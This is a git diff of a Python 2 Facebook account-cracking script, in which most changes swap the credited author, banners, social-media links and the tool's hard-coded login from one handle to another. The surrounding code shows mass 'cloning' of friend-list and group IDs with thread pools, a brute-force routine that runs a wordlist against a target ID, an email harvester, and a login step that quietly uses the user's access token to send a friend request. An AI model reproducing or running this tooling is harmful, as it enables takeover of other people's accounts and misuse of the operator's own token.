@@ -1,8 +1,8 @@
 ﻿#!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Rana Aahil
+#The Credit For This Code Goes To technical QUeeN 👑 hUSSNA TRICKER hacker ki jan
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
-#Reserved2020
+#Reserved2021
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
@@ -48,7 +48,7 @@ def jalan(z):
 		sys.stdout.flush()
 		time.sleep(0.001)
 
-#Dev:Rana
+#hacker ki jan:tech-queen
 ##### LOGO #####
 logo = """
 \033[1;96m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
@@ -65,15 +65,15 @@ logo = """
 \033[1;92m░░░██║░░░██║╚██████╔╝███████╗██║░░██║
 \033[1;92m░░░╚═╝░░░╚═╝░╚═════╝░╚══════╝╚═╝░░╚═╝
 
-\033[1;95m┈┈┈╱▔▔▔▔▔▔╲┈╭━━━╮┈┈ Fuck Fb System.
-\033[1;95m┈┈▕┈╭━╮╭━╮┈▏┃Rana┃┈┈
+\033[1;95m┈┈┈╱▔▔hacker▔▔▔▔╲┈╭━━━╮┈┈ Fuck Fb System.
+\033[1;95m┈┈▕┈╭━╮╭━╮┈▏┃queen┃┈┈
 \033[1;97m┈┈▕┈┃╭╯╰╮┃┈▏╰┳━━╯┈┈
-\033[1;97m┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈ 
-\033[1;97m┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈
+\033[1;97m┈┈▕┈╰╯╭╮╰╯┈▏┈┃┈┈┈┈┈ shock the system fuck you haters 
+\033[1;97m┈┈▕┈┈┈┃┃┈┈┈▏━╯┈┈┈┈┈feels the power of QUeeN 👑
 \033[1;95m┈┈▕┈┈┈╰╯┈┈┈▏┈┈┈┈┈┈┈
 \033[1;95m┈┈▕╱╲╱╲╱╲╱╲▏┈┈┈┈┈┈┈
-
-\033[1;93m▇▇▇▇▇ Facebook\033[1;93m Aahil ▇▇▇▇▇
+technical queen 
+\033[1;93m▇▇▇▇▇ Facebook\033[1;93mhttps://www.facebook.com/TechnicalQueen33
 \033[1;97m
                  ⊂ヽ
                　 ＼＼  Λ＿Λ
@@ -90,7 +90,7 @@ logo = """
                   　| |　　) /
                    ノ )    Lﾉ
                   (_／     　　　
-\033[1;97m:•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;93mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"""
+\033[1;97m:•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•\033[1;93mBlackTiger/\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ hacking force community•◄►•"""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -109,6 +109,7 @@ vuln = "\033[32mVuln"
 
 os.system("clear")
 print  """
+🇹🇪🇨🇭 🇶🇺🇪🇪🇳 🇭🇺🇸🇸🇳🇦
 \033[1;91m██████╗░██╗░░░░░░█████╗░░█████╗░██╗░░██╗
 \033[1;91m██╔══██╗██║░░░░░██╔══██╗██╔══██╗██║░██╔╝
 \033[1;93m██████╦╝██║░░░░░███████║██║░░╚═╝█████═╝░
@@ -131,7 +132,7 @@ jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶�
 jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
 jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷 ") 
 jalan("\033[0;31m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
-jalan("\033[1;35m☠ Welcome to Aahil Creations ☠ ") 
+jalan("\033[1;35m☠ Welcome to hussna Creations ☠ ") 
 jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
 jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷 ") 
 jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
@@ -140,8 +141,8 @@ jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇
 jalan("\033[0;37m▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇ ▇▶🌷") 
 print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;92mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
 
-CorrectUsername = "rana"
-CorrectPassword = "rana"
+CorrectUsername = "tech"
+CorrectPassword = "queen"
 
 loop = 'true'
 while (loop == 'true'):
@@ -149,15 +150,15 @@ while (loop == 'true'):
     if (username == CorrectUsername):
     	password = raw_input("\033[1;97m🗝 \x1b[1;91mTool Password  \x1b[1;97m»» \x1b[1;97m")
         if (password == CorrectPassword):
-            print "Logged in successfully as " + username #Dev:Rana
+            print "Logged in successfully as " + username #Dev:tech
 	    time.sleep(2)
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+            os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+        os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 
 def login():
 	os.system('clear')
@@ -204,7 +205,7 @@ def login():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\x1b[1;91mLogin Successful.•◄►•..'
-				os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+				os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -306,11 +307,11 @@ def pilih():
                 jalan('\033[1;96mpkg install git')
                 jalan('\033[1;96mpip2 install requests')
                 jalan('\033[1;96mpip2 install mechanize') 
-                jalan("\033[1;96mgit clone https://github.com/TheAahil/pakistan407")
-                jalan('\033[1;96mcd pakistan407')
-                jalan('\033[1;96mpython2 Aahil')
-                jalan('\033[1;96mUser: rana')
-                jalan('\033[1;96mpass: rana')
+                jalan("\033[1;96mgit clone https://github.com/technicalqueen/hussna-tricker")
+                jalan('\033[1;96mcd hussna-tricker')
+                jalan('\033[1;96mpython2 hacker')
+                jalan('\033[1;96mUser: tech')
+                jalan('\033[1;96mpass: queen')
                 jalan('\033[1;92m👆Copy Command & send 2 groups👆')
                 jalan('\033[1;91mYoutube Chenal Like Subscrib plzz')
 		os.system('git pull origin master')
@@ -364,7 +365,7 @@ def crack():
 	print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;95mClone Friend List Public ID."
         print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;95mBlack Tiger Facebook Group Pakistan."
         print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;95mBlack Tiger Group Cloning."
-        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m4.\x1b[1;95mBlack Tiger Youtube Chenal."
+        print "\033[1;93m-•◄►•-\033[1;97m> \033[1;91m4.\x1b[1;95mMaser In Ethical Hacking Youtube Chenal."
 	print "\033[1;93m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_crack()
 
@@ -648,7 +649,7 @@ def pilih_crack():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
-	print "  \033[1;91m«---•◄►•---Developed By Rana-Aahil--•◄►•---»" #Dev:Rana
+	print "  \033[1;91m«---•◄►•---Developed By tech QUEEN 👑 hUSSNA TRICKER hacker ki jan•◄►•---»" #Dev:Rana
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -672,10 +673,10 @@ _______¶¶¶_________¶______¶_________¶¶¶______
  
          Checkpoint ID Open After 7 Days
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.
-: \033[1;91m ....Rana Aahil  BlackTiger....... \033[1;95m :
+: \033[1;91m ....Tech QUEEN hUSSNA TRICKER Master in Ethical Hacking...... \033[1;95m :
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;91m FACEBOOK AAHIL"""
+              \033[1;91m FACEBOOK TechnicalQueen33"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
@@ -693,8 +694,8 @@ def hack():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;96mClone Friend List Public ID."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;96mBlack Tiger Facebook Group Indonasia."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;96mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;96mMaser in EthicalHacking Facebook Group Indonasia."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;96mmaser in Ethical Hacking Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_hack()
 
@@ -707,7 +708,7 @@ def pilih_hack():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◄►•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
+		print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mMaser In EthicalHacking\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -739,9 +740,9 @@ def pilih_hack():
 	for o in titik:
 		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
 	print "\n\033[1;91m«--•◄►••◄►•---\x1b[1;95m•◄►•Stop Process Press CTRL+Z•◄►•\033[1;91m---•◄►••◄►•-»"
-	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
+	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mTech Queen hacker \033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
 	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
-	print "\033[1;96m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;96m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
+	print "\033[1;96m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mHacker QUeeN hussna\033[1;96m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
 	
 			
 	def main(arg):
@@ -960,9 +961,9 @@ def pilih_hack():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
-	print "  \033[1;91m«---•◄►•---Developed By Rana-Aahil--•◄►•---»" #Dev:Rana
-	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
+	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mMaser In EthicalHacking\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
+	print "  \033[1;91m«---•◄►•---Developed By Tech Queen Hussna TRICKER-•◄►•---»" #Hacker kure
+	print '\033[1;93m✅Process Has Been Completed QUeeN say tahnk for using my command Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
  ╔══╗───█──────────█▀────╔══╗
@@ -976,10 +977,10 @@ def pilih_hack():
 ────────────╚══╝────────────
          Checkpoint ID Open After 7 Days
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.
-: \033[1;91m ....Rana Aahil  BlackTiger....... \033[1;95m :
+: \033[1;91m ....tech QUEEN hUSSNA master in EthicalHacking....... \033[1;95m :
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;91m FACEBOOK AAHIL"""
+              \033[1;91m FACEBOOK TechnicalQueen33"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
@@ -997,8 +998,8 @@ def black():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m1.\x1b[1;97mClone Friend List Public ID."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;97mBlack Tiger Facebook Group USA."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;97mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m2.\x1b[1;97mMaser In EthicalHacking Facebook Group USA."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;91m3.\x1b[1;97mMaser In EthicalHacking Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;91m> \033[1;91m0.\033[1;91mBack"
 	pilih_black()
 
@@ -1011,7 +1012,7 @@ def pilih_black():
 		os.system('clear')
 		print logo
 		idt = raw_input("\033[1;95m[•◄►•] \033[1;91mEnter ID\033[1;95m: \033[1;95m")
-		print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
+		print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mMaser In EthicalHacking\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
@@ -1029,7 +1030,7 @@ def pilih_black():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1043,9 +1044,9 @@ def pilih_black():
 	for o in titik:
 		print("\r\033[1;95mCloning\033[1;91m"+o),;sys.stdout.flush();time.sleep(0.00001)
 	print "\n\033[1;91m«--•◄►••◄►•---\x1b[1;95m•◄►•Stop Process Press CTRL+Z•◄►•\033[1;91m---•◄►••◄►•-»"
-	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
+	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mTech Queen\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
 	jalan(' \033[1;91m.................\033[1;95mCloning Start..\033[1;91m............ ')
-	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
+	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mMaser In EthicalHacking\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
 	
 			
 	def main(arg):
@@ -1263,8 +1264,8 @@ def pilih_black():
 		
 	p = ThreadPool(30)
 	p.map(main, id)
-	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mBlackTiger\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
-	print "  \033[1;91m«---•◄►•---Developed By Rana-Aahil--•◄►•---»" #Dev:Rana
+	print "\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;91mMaser In EthicalHacking\033[1;95m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
+	print "  \033[1;91m«---•◄►•---Developed By hUSSNA hacker ki jan--•◄►•---»" #Dev:tech QUEEN
 	print '\033[1;93m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
 	print """
@@ -1282,10 +1283,10 @@ ____________☆☆☆________★ ★ ★____________
 ______________☆____________★______________
          Checkpoint ID Open After 7 Days
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.
-: \033[1;91m ....Rana Aahil  BlackTiger....... \033[1;95m :
+: \033[1;91m ....Rana Technical QUeeN hUSSNA  ....... \033[1;95m :
 •\033[1;95m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;91m FACEBOOK AAHIL"""
+              \033[1;91m FACEBOOK TechnicalQueen33"""
 	
 	raw_input("\n\033[1;95m[\033[1;91mBack\033[1;95m]")
 	menu()
@@ -1303,8 +1304,8 @@ def Tiger():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;95mClone Friend List Public ID."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;95mBlack Tiger Facebook Group Bangladash."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;95mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;95mMaser In EthicalHacking Facebook Group Bangladash."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;95mMaster In EthicalHacking Youtube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_Tiger()
 
@@ -1335,7 +1336,7 @@ def pilih_Tiger():
 	        os.system('xdg-open https://mobile.facebook.com/groups/352588752366665')
 	        menu()
         elif peak =="3":
-	        os.system('xdg-open https://m.youtube.com/channel/UCsdJQbRf0xpvwaDu1rqgJuA')
+	        os.system('xdg-open https://m.youtube.com/channel/UCDKRvmw7ufXejkYXG51liKA')
 	        menu()
 	elif peak =="0":
 		menu()
@@ -1349,9 +1350,9 @@ def pilih_Tiger():
 	for o in titik:
 		print("\r\033[1;94mCloning\033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«--•◄►••◄►•---\x1b[1;94m•◄►•Stop Process Press CTRL+Z•◄►•\033[1;97m---•◄►••◄►•-»"
-	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
+	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mBlackHacker QUeeN\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
 	jalan(' \033[1;97m.................\033[1;94mCloning Start..\033[1;97m............ ')
-	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
+	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mBlackhacker QUeeN\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═ •◄►•"
 	
 			
 	def main(arg):
@@ -1569,7 +1570,7 @@ def pilih_Tiger():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
-	print "  \033[1;94m«---•◄►•---Developed By Rana-Aahil--•◄►•---»" #Dev:Rana
+	print "  \033[1;94m«---•◄►•---Developed By hUSSNA TRICKER-•◄►•---»" #Dev:tech QUEEN
 	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;97m....'
 	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
 	print """
@@ -1589,10 +1590,10 @@ _________$$$$$__$$$$$___$$$$$__$$$$$____
  
          Checkpoint ID Open After 7 Days
 •\033[1;97m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.
-: \033[1;94m .....Rana Aahil  BlackTiger....... \033[1;97m :
+: \033[1;94m ..... hUSSNA TRICKER  Master in EthicalHacking....... \033[1;97m :
 •\033[1;97m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;94m +923094161457"""
+              \033[1;94m TechnicalQueen33"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
@@ -1610,8 +1611,8 @@ def test():
 	os.system('clear')
 	print logo
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m1.\x1b[1;92mClone Friend List Public ID Testing."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack Tiger Facebook Group."
-        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack Tiger Youtube Chenal."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m2.\x1b[1;92mBlack hacker QUeeN Facebook Group."
+        print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m3.\x1b[1;92mBlack hackersYoutube Chenal."
 	print "\033[1;97m-•◄►•-\033[1;97m> \033[1;97m0.\033[1;91mBack"
 	pilih_test()
 
@@ -2175,7 +2176,7 @@ def pilih_super():
 	p = ThreadPool(30)
 	p.map(main, id)
 	print "\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•\033[1;94mBlackTiger\033[1;97m•◄►•═ ═ ═ ═ ═ ═ ═•◄►•"
-	print "  \033[1;94m«---•◄►•---Developed By Rana-Aahil--•◄►•---»" #Dev:Rana
+	print "  \033[1;94m«---•◄►•---Developed By technicl QUeeN--•◄►•---»" #Dev:hacker ki jan
 	print '\033[1;94m✅Process Has Been Completed Press➡ Ctrl+Z.↩ Next Type (0 & Data Reset)↩\033[1;91m....'
 	print"\033[1;91mTotal OK/\x1b[1;94mCP \033[1;97m: \033[1;97m"+str(len(oks))+"\033[1;97m/\033[1;91m"+str(len(cekpoint))
 	print """
@@ -2197,10 +2198,10 @@ def pilih_super():
  
          Checkpoint ID Open After 7 Days
 •\033[1;97m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.
-: \033[1;94m .....Rana Aahil  BlackTiger....... \033[1;97m :
+: \033[1;94m .....Technical QUeeNr....... \033[1;97m :
 •\033[1;97m◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.' 
                 JOIN ME
-              \033[1;94m +923094161457"""
+              \033[1;94m TechnicalQueen33"""
 	
 	raw_input("\n\033[1;97m[\033[1;94mBack\033[1;97m]")
 	menu()
@@ -2275,7 +2276,7 @@ def clone_dari_member_group():
 	print 42*"\033[1;96m="
 	print '\033[1;96m[\033[1;97m✓\033[1;96m] \033[1;92mSelesai \033[1;97m....'
 	print"\033[1;96m[+] \033[1;92mTotal \033[1;91m: \033[1;97m"+str(len(berhasil))
-	print"\033[1;96m[+] \033[1;92mFile Rana Aahil\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
+	print"\033[1;96m[+] \033[1;92mFile technical QUeeN\033[1;91m:\033[1;97m out/GrupMailVuln.txt"
 	raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
 	menu()
 	
@@ -2294,7 +2295,7 @@ def brute():
         print '\033[1;93m ◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.'
         try:
             email = raw_input('\x1b[1;92m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
-            passw = raw_input('\x1b[1;92m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉Rana Aahil.txt) \x1b[1;91m: \x1b[1;97m')
+            passw = raw_input('\x1b[1;92m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉technical queen.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
             print '\033[1;95m ◄►•═ ═ ═ ═ ═ ═ ═•◄►•═ ═ ═ ═ ═ ═ ═•◄►•.'
